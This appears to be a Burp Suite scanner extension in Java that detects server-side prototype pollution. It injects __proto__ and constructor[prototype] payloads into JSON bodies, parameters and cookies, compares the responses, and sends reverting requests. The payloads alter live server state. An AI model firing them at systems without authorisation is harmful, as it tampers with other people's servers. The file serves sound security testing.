package burp;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.google.gson.JsonSyntaxException;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ServerSidePrototypePollutionScan extends Scan {

    private final String DETAIL = "This application is vulnerable to Server side prototype pollution";
    private final String CANARY = "f1e3f7a9";
    private final Integer MAX_RETRIES = 3;

    private final Map<String, String[]> paramTechniques = new HashMap<String, String[]>()
    {
        {
            put("constructor[prototype][json spaces]", new String[]{" ", "", "spacing"});
            put("constructor[prototype][status]", new String[]{"blah", "", "status"});
            put("constructor[prototype][head]", new String[]{"true", "0", "options"});
            put("constructor[prototype][exposedHeaders][]", new String[]{CANARY, "", "exposedHeaders"});
        }
    };

    private final Map<String, String[]> jsonTechniques = new HashMap<String, String[]>()
    {
        {
            put("spacing", new String[]{
                    "constructor","{\"prototype\":{\"json spaces\":\" \"}}", "{\"prototype\":{\"json spaces\":\"\"}}",
                    "__proto__","{\"json spaces\":\" \"}","{\"json spaces\":\"\"}"
            });
            put("options", new String[]{
                    "constructor","{\"prototype\":{\"head\":true}}","{\"prototype\":{\"head\":false}}",
                    "__proto__","{\"head\":true}","{\"head\":false}"
            });
            put("status", new String[]{
                    "constructor","{\"prototype\":{\"status\":510}}", "{\"prototype\":{\"status\":0}}",
                    "__proto__","{\"status\":510}","{\"status\":0}"
            });
            put("exposedHeaders", new String[]{
                    "constructor","{\"prototype\":{\"exposedHeaders\":[\""+CANARY+"\"]}}", "{\"prototype\":{\"exposedHeaders\":null}}",
                    "__proto__","{\"exposedHeaders\":[\""+CANARY+"\"]}","{\"exposedHeaders\":null}"
            });
        }
    };

    ServerSidePrototypePollutionScan(String name) {
        super(name);
    }

    @Override
    List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        for (Map.Entry<String, String[]> technique : jsonTechniques.entrySet()) {
            String attackType = technique.getKey();
            doAttack(baseReq, Utilities.getBody(baseReq), service, technique.getValue(), attackType, true);
        }

        return null;
    }

    private byte[] injectCookies(byte[] req, String[] jsonTechniques, Boolean nullify, String attackType) {
        List<String> cookieHeaderOut = new ArrayList<>();
        String cookieHeader = Utilities.getHeader(req, "Cookie");
        if(cookieHeader.length() == 0) {
            return req;
        }
        String[] cookies = cookieHeader.split(";");

        for(int i=0;i< cookies.length;i++) {
            String cookie = cookies[i];
            String[] cookieNameValue = cookie.split("=");
            String cookieName = cookieNameValue[0];
            String cookieValue = cookieNameValue[1];
            String decodedCookieName = urlDecodeWithoutPlus(cookieName);
            String decodedCookieValue = urlDecodeWithoutPlus(cookieValue.trim());
            if((decodedCookieValue.startsWith("j:") && decodedCookieValue.contains("{") && decodedCookieValue.contains("}")) || decodedCookieValue.startsWith("{") || decodedCookieValue.startsWith("[{]")) {
                Boolean jsonCookieFlag = false;
                if(decodedCookieValue.startsWith("j:")) {
                    jsonCookieFlag = true;
                    decodedCookieValue = decodedCookieValue.substring(2);
                }
                if(isValidJson(decodedCookieValue)) {
                    cookieHeaderOut.add(urlEncodeWithoutPlus(decodedCookieName)+"="+(jsonCookieFlag ? "j:" : "")+urlEncodeWithoutPlus(generateJson(decodedCookieValue, jsonTechniques, nullify).toString()));
                } else {
                    cookieHeaderOut.add(urlEncodeWithoutPlus(decodedCookieName)+"="+cookieValue);
                }
            } else if(decodedCookieName.contains("[") && decodedCookieName.contains("]")) {
                for (Map.Entry<String, String[]> injectionEntry : paramTechniques.entrySet()) {
                    String techniqueParamName = injectionEntry.getKey();
                    String techniqueParamValue = injectionEntry.getValue()[0];
                    String nullifyParamValue = injectionEntry.getValue()[1];
                    String techniqueType = injectionEntry.getValue()[2];
                    if (!techniqueType.equals(attackType)) {
                        continue;
                    }
                    cookieHeaderOut.add(techniqueParamName+"="+urlEncodeWithoutPlus(nullify ? nullifyParamValue : techniqueParamValue));
                    cookieHeaderOut.add(urlEncodeWithoutPlus(replaceLastPartOfParamName( decodedCookieName, techniqueParamName))+"="+urlEncodeWithoutPlus(nullify ? nullifyParamValue : techniqueParamValue));
                }
            } else {
                cookieHeaderOut.add(urlEncodeWithoutPlus(decodedCookieName)+"=j:"+urlEncodeWithoutPlus(generateJson("{}", jsonTechniques, nullify).toString()));
            }
        }

        return Utilities.addOrReplaceHeader(req, "Cookie", String.join(";", cookieHeaderOut));
    }

    private JsonElement generateJson(String jsonString, String[] currentTechnique, Boolean nullify) {
        JsonParser parser = new JsonParser();
        JsonElement jsonElement = null;
        JsonElement json = null;

        try {
            jsonElement = parser.parse(jsonString);
            json = traverseJsonTreeAndInject(deepJsonClone(jsonElement), currentTechnique, nullify);
            return json;
        } catch(JsonSyntaxException e) {
            Utilities.err("Invalid JSON:" + e);
            return null;
        }
    }

    private String replaceLastPartOfParamName(String paramName, String techniqueParamName) {
        return paramName.replaceAll("\\[.+", "") + techniqueParamName.replace("constructor", "[constructor]");
    }

    private void doParameterAttack(byte[] baseReq, IHttpService service, String attackType) {
        byte insertionPointType;
        String method = Utilities.getMethod(baseReq);
        if(method.equalsIgnoreCase("get")) {
            insertionPointType = IScannerInsertionPoint.INS_PARAM_URL;
        } else {
            insertionPointType = IScannerInsertionPoint.INS_PARAM_BODY;
        }

        for (Map.Entry<String, String[]> injectionEntry : paramTechniques.entrySet()) {
            String techniqueParamName = injectionEntry.getKey();
            String techniqueParamValue = injectionEntry.getValue()[0];
            String nullifyParamValue = injectionEntry.getValue()[1];
            String techniqueType = injectionEntry.getValue()[2];

            if(!techniqueType.equals(attackType)) {
                continue;
            }

            byte[] clonedBaseReq = baseReq.clone();
            List<IParameter> params = Utilities.helpers.analyzeRequest(service, clonedBaseReq).getParameters();
            for (IParameter param : params) {
                if(param.getType() != IScannerInsertionPoint.INS_PARAM_URL && param.getType() != IScannerInsertionPoint.INS_PARAM_BODY) {
                    continue;
                }
                String paramName = param.getName();
                String paramValue = Utilities.helpers.urlDecode(param.getValue()).trim();
                if((paramValue.startsWith("{") || paramValue.startsWith("[")) && isValidJson(paramValue)) {
                    for (Map.Entry<String, String[]> technique : jsonTechniques.entrySet()) {
                        if(!technique.getKey().equals(attackType)) {
                            continue;
                        }
                        byte[] attackRequest = baseReq.clone();
                        JsonElement attackJson = generateJson(paramValue, technique.getValue(), false);
                        attackRequest = Utilities.helpers.updateParameter(attackRequest, createParameter(paramName, attackJson.toString(),param.getType()));
                        doJsonAttack(clonedBaseReq, service, attackRequest, attackType, paramValue, false, technique.getValue(), false, param);
                    }
                } else if(paramName.contains("[") && paramName.contains("]")) {
                    techniqueParamName =  replaceLastPartOfParamName(paramName, techniqueParamName);
                    clonedBaseReq = Utilities.helpers.removeParameter(clonedBaseReq, param);
                    break;
                }
            }

            IParameter attackParam = createParameter(techniqueParamName, techniqueParamValue, insertionPointType);
            byte[] attackRequest = addParameter(clonedBaseReq, attackParam);
            Resp attackResp = request(service, attackRequest, MAX_RETRIES);

            if(attackResp.failed()) {
                continue;
            }

            if(techniqueType.equals("spacing")) {
                Resp baseResp = request(service, clonedBaseReq, MAX_RETRIES);
                String response = Utilities.getBody(baseResp.getReq().getResponse());

                if(baseResp.failed()) {
                    continue;
                }

                if (hasSpacing(response)) {
                    IParameter nullifyParam = createParameter(techniqueParamName, nullifyParamValue, insertionPointType);
                    byte[] nullifyRequest = addParameter(clonedBaseReq, nullifyParam);
                    Resp nullify = request(service, nullifyRequest, MAX_RETRIES);
                    Resp nullifiedResponse = request(service, clonedBaseReq, MAX_RETRIES);

                    if(nullifiedResponse.failed()) {
                        continue;
                    }

                    String nullifiedResponseStr = Utilities.getBody(nullifiedResponse.getReq().getResponse());
                    if (!hasSpacing(nullifiedResponseStr)) {
                        reportIssue("PP param spacing via " + method, DETAIL, "High", "Firm", ".", baseReq, attackResp, baseResp, nullify, nullifiedResponse);
                    }
                }
            } else if(techniqueType.equals("status")) {
                Resp invalidJsonResp = makeInvalidJsonRequest(service, clonedBaseReq);

                if(invalidJsonResp.failed()) {
                    continue;
                }

                if(hasStatusCode(500, invalidJsonResp)) {
                    IParameter nullifyParam = createParameter(techniqueParamName, nullifyParamValue, insertionPointType);
                    byte[] nullifyAttackRequest = addParameter(clonedBaseReq, nullifyParam);
                    Resp nullifyAttackResp = request(service, nullifyAttackRequest, MAX_RETRIES);

                    if(nullifyAttackResp.failed()) {
                        continue;
                    }

                    Resp nullifiedInvalidJsonResp = makeInvalidJsonRequest(service, clonedBaseReq);

                    if(nullifiedInvalidJsonResp.failed()) {
                        continue;
                    }

                    if(!hasStatusCode(500, nullifiedInvalidJsonResp)) {
                        reportIssue("PP param status code via " + method, DETAIL, "High", "Firm", ".", clonedBaseReq, attackResp, invalidJsonResp, nullifyAttackResp, nullifiedInvalidJsonResp);
                    }
                }
            } else if(techniqueType.equals("options")) {
                Resp optionsResp = request(service, Utilities.setMethod(clonedBaseReq, "OPTIONS"), MAX_RETRIES);

                if(optionsResp.failed()) {
                    continue;
                }

                String allow = Utilities.getHeader(optionsResp.getReq().getResponse(), "Allow").toLowerCase();
                if(!allow.contains("head") && allow.length() > 0) {
                    IParameter nullifyParam = createParameter(techniqueParamName, nullifyParamValue, insertionPointType);
                    byte[] nullifyAttackRequest = addParameter(clonedBaseReq, nullifyParam);
                    Resp nullifyAttackRequestResp = request(service, nullifyAttackRequest, MAX_RETRIES);

                    if(nullifyAttackRequestResp.failed()) {
                        continue;
                    }

                    Resp nullifyOptionsResp = request(service, Utilities.setMethod(clonedBaseReq, "OPTIONS"), MAX_RETRIES);

                    if(nullifyOptionsResp.failed()) {
                        continue;
                    }

                    String nullifiedAllow = Utilities.getHeader(nullifyOptionsResp.getReq().getResponse(), "Allow").toLowerCase();
                    if(nullifiedAllow.contains("head")) {
                        reportIssue("PP param head via " + method, DETAIL, "High", "Firm", ".", clonedBaseReq, attackResp, optionsResp, nullifyAttackRequestResp, nullifyOptionsResp);
                    }
                }
            } else if(attackType.equals("exposedHeaders")) {
                Resp baseResp = request(service, clonedBaseReq, MAX_RETRIES);

                if(baseResp.failed()) {
                    continue;
                }

                String accessControlExposeHeaders = Utilities.getHeader(baseResp.getReq().getResponse(), "Access-Control-Expose-Headers").toLowerCase();
                if(accessControlExposeHeaders.contains(CANARY)) {
                    IParameter nullifyParam = createParameter(techniqueParamName, nullifyParamValue, insertionPointType);
                    byte[] nullifyAttackRequest = addParameter(clonedBaseReq, nullifyParam);
                    Resp nullifyAttackRequestResp = request(service, nullifyAttackRequest, MAX_RETRIES);

                    if(nullifyAttackRequestResp.failed()) {
                        continue;
                    }

                    Resp nullifyResp = request(service, clonedBaseReq, MAX_RETRIES);

                    if(nullifyResp.failed()) {
                        continue;
                    }

                    String nullifiedAccessControlExposeHeaders = Utilities.getHeader(nullifyResp.getReq().getResponse(), "Access-Control-Expose-Headers").toLowerCase();
                    if(!nullifiedAccessControlExposeHeaders.contains(CANARY)) {
                        reportIssue("PP param exposedHeaders via " + method, DETAIL, "High", "Firm", ".", clonedBaseReq, attackResp, baseResp, nullifyAttackRequestResp, nullifyAttackRequestResp, nullifyResp);
                    }
                }
            }
        }
    }

    private byte[] createRequest(String jsonString, Boolean shouldInjectCookies, byte[] baseReq, String[] currentTechnique, String attackType, Boolean hasBody, Boolean nullify, IParameter param) {
        JsonElement json = generateJson(jsonString, currentTechnique, nullify);
        byte[] request = shouldInjectCookies ? injectCookies(baseReq.clone(), currentTechnique, nullify, attackType) : baseReq.clone();
        if(hasBody) {
            request = Utilities.setBody(request, json.toString());
            request = Utilities.fixContentLength(request);
        }
        if(param != null) {
            request = Utilities.helpers.updateParameter(request, createParameter(param.getName(), json.toString(),param.getType()));
        }
        return request;
    }

    private void doAttack(byte[] baseReq, String jsonString, IHttpService service,  String[] currentTechnique, String attackType, Boolean shouldInjectCookies) {

        JsonElement attackJson = generateJson(jsonString, currentTechnique, false);

        Boolean hasBody = false;
        byte[] attackRequest = shouldInjectCookies ? injectCookies(baseReq.clone(), currentTechnique, false, attackType) : baseReq.clone();

        if(attackJson != null && !attackJson.isJsonNull()) {
            attackRequest = Utilities.setBody(attackRequest, attackJson.toString());
            attackRequest = Utilities.fixContentLength(attackRequest);
            hasBody = true;
        }

        if(!hasBody) {
            doParameterAttack(baseReq, service, attackType);
        }

        doJsonAttack(baseReq, service, attackRequest, attackType, jsonString, shouldInjectCookies, currentTechnique, hasBody, null);

     }

     private void doJsonAttack(byte[] baseReq, IHttpService service, byte[] attackRequest, String attackType, String jsonString, Boolean shouldInjectCookies, String[] currentTechnique, Boolean hasBody, IParameter param) {
         Resp attackResp = request(service, attackRequest, MAX_RETRIES);

         if(attackResp.failed()) {
             return;
         }

         if(attackType.equals("spacing")) {
             Resp baseResp = request(service, baseReq, MAX_RETRIES);

             if(baseResp.failed()) {
                 return;
             }

             String response = Utilities.getBody(baseResp.getReq().getResponse());
             if(hasSpacing(response)) {
                 byte[] nullifyAttackRequest = createRequest(jsonString, shouldInjectCookies, baseReq, currentTechnique, attackType, hasBody, true, param);
                 request(service, nullifyAttackRequest, MAX_RETRIES);
                 Resp nullifyResponse = request(service, baseReq, MAX_RETRIES);

                 if(nullifyResponse.failed()) {
                     return;
                 }

                 String nullifyResponseStr = Utilities.getBody(nullifyResponse.getReq().getResponse());
                 if(!hasSpacing(nullifyResponseStr)) {
                     reportIssue("PP JSON spacing", DETAIL, "High", "Firm", ".", baseReq, attackResp, baseResp, nullifyResponse);
                 }
             }
         } else if(attackType.equals("status")) {
             Resp invalidJsonResp = makeInvalidJsonRequest(service, baseReq);
             if(hasStatusCode(510, invalidJsonResp)) {
                 byte[] nullifyAttackRequest = createRequest(jsonString, shouldInjectCookies, baseReq, currentTechnique, attackType, hasBody, true, param);
                 request(service, nullifyAttackRequest, MAX_RETRIES);
                 Resp nullifyAttackRequestResp = request(service, nullifyAttackRequest, MAX_RETRIES);

                 if(nullifyAttackRequestResp.failed()) {
                     return;
                 }

                 Resp invalidJsonNullified = makeInvalidJsonRequest(service, baseReq);
                 if(!hasStatusCode(510, invalidJsonNullified)) {
                     reportIssue("PP JSON status", DETAIL, "High", "Firm", ".", baseReq, attackResp, invalidJsonResp, nullifyAttackRequestResp, invalidJsonNullified);
                 }
             }
         } else if(attackType.equals("options")) {
             Resp optionsResp = request(service, Utilities.setMethod(baseReq, "OPTIONS"), MAX_RETRIES);

             if(optionsResp.failed()) {
                 return;
             }

             String allow = Utilities.getHeader(optionsResp.getReq().getResponse(), "Allow").toLowerCase();
             if(!allow.contains("head") && allow.length() > 0) {
                 byte[] nullifyAttackRequest = createRequest(jsonString, shouldInjectCookies, baseReq, currentTechnique, attackType, hasBody, true, param);
                 request(service, nullifyAttackRequest, MAX_RETRIES);
                 Resp nullifyAttackRequestResp = request(service, nullifyAttackRequest, MAX_RETRIES);

                 if(nullifyAttackRequestResp.failed()) {
                     return;
                 }

                 Resp nullifyOptionsResp = request(service, Utilities.setMethod(baseReq, "OPTIONS"), MAX_RETRIES);

                 if(nullifyOptionsResp.failed()) {
                     return;
                 }

                 String nullifiedAllow = Utilities.getHeader(nullifyOptionsResp.getReq().getResponse(), "Allow").toLowerCase();
                 if(nullifiedAllow.contains("head")) {
                     reportIssue("PP JSON head", DETAIL, "High", "Firm", ".", baseReq, attackResp, optionsResp, nullifyAttackRequestResp, nullifyOptionsResp);
                 }
             }
         } else if(attackType.equals("exposedHeaders")) {
             Resp baseResp = request(service, baseReq, MAX_RETRIES);

             if(baseResp.failed()) {
                 return;
             }

             String accessControlExposeHeaders = Utilities.getHeader(baseResp.getReq().getResponse(), "Access-Control-Expose-Headers").toLowerCase();
             if(accessControlExposeHeaders.contains(CANARY)) {
                 byte[] nullifyAttackRequest = createRequest(jsonString, shouldInjectCookies, baseReq, currentTechnique, attackType, hasBody, true, param);
                 request(service, nullifyAttackRequest, MAX_RETRIES);
                 Resp nullifyAttackRequestResp = request(service, nullifyAttackRequest, MAX_RETRIES);

                 if(nullifyAttackRequestResp.failed()) {
                     return;
                 }

                 Resp nullifyResp = request(service, baseReq,MAX_RETRIES);

                 if(nullifyResp.failed()) {
                     return;
                 }

                 String nullifiedAccessControlExposeHeaders = Utilities.getHeader(nullifyResp.getReq().getResponse(), "Access-Control-Expose-Headers").toLowerCase();
                 if(!nullifiedAccessControlExposeHeaders.contains(CANARY)) {
                     reportIssue("PP JSON exposedHeaders", DETAIL, "High", "Firm", ".", baseReq, attackResp, baseResp, nullifyAttackRequestResp, nullifyAttackRequestResp, nullifyResp);
                 }
             }
         }
     }

     static Boolean isValidJson(String json) {
         JsonParser parser = new JsonParser();
         try {
             parser.parse(json);
             return true;
         } catch(JsonSyntaxException e) {
             Utilities.err("Invalid JSON:" + e);
             return false;
         }
     }

    static Boolean hasSpacing(String response) {
        String responseStart = response.substring(0,response.length() > 20 ? 20 : response.length());
        Pattern regex = Pattern.compile("^\\s*[{\\[]\\s+", Pattern.CASE_INSENSITIVE);
        Matcher matcher = regex.matcher(responseStart);
        return matcher.find();
    }

    public JsonElement deepJsonClone(JsonElement jsonElement) {
        try {
            JsonParser parser = new JsonParser();
            return parser.parse(jsonElement.toString());
        } catch(JsonSyntaxException e) {
            Utilities.err("Failed to clone object");
            return null;
        }
    }

    public JsonElement traverseJsonTreeAndInject(JsonElement jsonElement, String[] currentTechnique, Boolean nullify) {
        if (jsonElement.isJsonNull()) {
            return jsonElement;
        }

        if (jsonElement.isJsonPrimitive()) {
            return jsonElement;
        }

        if (jsonElement.isJsonArray()) {
            JsonArray jsonArray = jsonElement.getAsJsonArray();
            if ( null != jsonArray) {
                for (int i=0;i<jsonArray.size();i++) {
                    jsonArray.set(i,traverseJsonTreeAndInject(jsonArray.get(i), currentTechnique, nullify));
                }
            }
            return jsonArray;
        }

        if (jsonElement.isJsonObject()) {
            Set<Map.Entry<String, JsonElement>> jsonObjectEntrySet = jsonElement.getAsJsonObject().entrySet();
            for (Map.Entry<String, JsonElement> jsonEntry : jsonObjectEntrySet) {
                traverseJsonTreeAndInject(jsonEntry.getValue(), currentTechnique, nullify);
            }

            for(int i=0;i<currentTechnique.length; i+=3) {
                String techniquePropertyName = currentTechnique[i];
                String techniqueValue = currentTechnique[!nullify?i+1:i+2];
                JsonParser parser = new JsonParser();
                jsonElement.getAsJsonObject().add(techniquePropertyName, parser.parse(techniqueValue));
            }
        }
        return jsonElement;
    }

    private byte[] addParameter(byte[] req, IParameter parameter) {
        return Utilities.helpers.addParameter(req, parameter);
    }

    private IParameter createParameter(String paramName, String paramValue, byte insertionPointType) {
        return Utilities.helpers.buildParameter(Utilities.helpers.urlEncode(paramName), Utilities.helpers.urlEncode(paramValue), insertionPointType);
    }

    private String urlDecodeWithoutPlus(String encoded) {
        return Utilities.helpers.urlDecode(encoded.replaceAll("\\+", "%2b"));
    }

    private String urlEncodeWithoutPlus(String unEncoded) {
        return Utilities.helpers.urlEncode(unEncoded).replaceAll("\\+", "%20");
    }

    static Boolean hasStatusCode(Integer status, Resp response) {
        return response.getStatus() == status;
    }

    private Resp makeInvalidJsonRequest(IHttpService service, byte[] req) {
        String method = Utilities.getMethod(req);
        String contentType = Utilities.getHeader(req, "Content-Type");
        if(contentType.length() == 0 || contentType.contains("text/html") || contentType.contains("application/x-www-form-urlencoded")) {
            req = Utilities.addOrReplaceHeader(req, "Content-Type", "application/json");
        }
        req = Utilities.addOrReplaceHeader(req, "Content-Length", "0");
        req = Utilities.setBody(req, method.equalsIgnoreCase("get") ? "\n{" : "{");
        req = Utilities.fixContentLength(req);
        return request(service, req, MAX_RETRIES);
    }

    static void reportIssue(String title, String detail, String severity, String confidence, String remediation, byte[] baseBytes, Resp... requests) {
        IHttpRequestResponse base = requests[0].getReq();
        IHttpService service = base.getHttpService();
        ArrayList<IHttpRequestResponse> reqsToReport = new ArrayList();
        if (baseBytes != null) {
            Resp baseReq = new Resp(new Req(baseBytes, (byte[])null, service));
            reqsToReport.add(baseReq.getReq());
        }
        int len = requests.length;
        for(int i = 0; i < len; ++i) {
            Resp request = requests[i];
            reqsToReport.add(request.getReq());
        }
        Utilities.callbacks.addScanIssue(new CustomScanIssue(service, Utilities.getURL(base.getRequest(), service), reqsToReport.toArray(new IHttpRequestResponse[0]), title, detail, severity, confidence, remediation));
    }
}